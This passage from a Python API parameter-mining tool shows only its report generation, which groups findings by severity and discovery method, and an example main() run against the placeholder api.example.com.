        """Generate comprehensive report of all findings"""
        if not self.findings:
            return {
                'status': 'no_findings',
                'total_findings': 0,
                'findings': [],
                'summary': 'No parameter vulnerabilities found.'
            }

        # Group by severity
        by_severity = {}
        for finding in self.findings:
            severity = finding.severity.value
            if severity not in by_severity:
                by_severity[severity] = []
            by_severity[severity].append(finding)

        # Group by discovery method
        by_method = {}
        for finding in self.findings:
            method = finding.discovery_method.value
            if method not in by_method:
                by_method[method] = []
            by_method[method].append(finding)

        return {
            'status': 'vulnerable',
            'total_findings': len(self.findings),
            'critical': len(by_severity.get('CRITICAL', [])),
            'high': len(by_severity.get('HIGH', [])),
            'medium': len(by_severity.get('MEDIUM', [])),
            'low': len(by_severity.get('LOW', [])),
            'by_discovery_method': {k: len(v) for k, v in by_method.items()},
            'findings': [finding.to_dict() for finding in self.findings],
            'summary': self._generate_summary()
        }

    def _generate_summary(self) -> str:
        """Generate executive summary"""
        total = len(self.findings)
        critical = len([f for f in self.findings if f.severity == SeverityLevel.CRITICAL])
        high = len([f for f in self.findings if f.severity == SeverityLevel.HIGH])

        summary = f"Discovered {total} parameter vulnerabilities: "
        summary += f"{critical} CRITICAL, {high} HIGH severity issues."

        return summary


# Example usage
def main():
    """Example usage of API Parameter Miner"""

    # Initialize miner
    miner = APIParameterMiner(
        base_url="https://api.example.com",
        target_domain="example.com"
    )

    # Mine parameters on endpoint
    findings = miner.mine_parameters(
        endpoint="/api/v1/users",
        method="POST",
        body={"username": "test", "email": "test@example.com"}
    )

    print(f"\nFound {len(findings)} vulnerabilities")

    # Generate report
    report = miner.generate_report()
    print(json.dumps(report, indent=2))


if __name__ == "__main__":
    main()
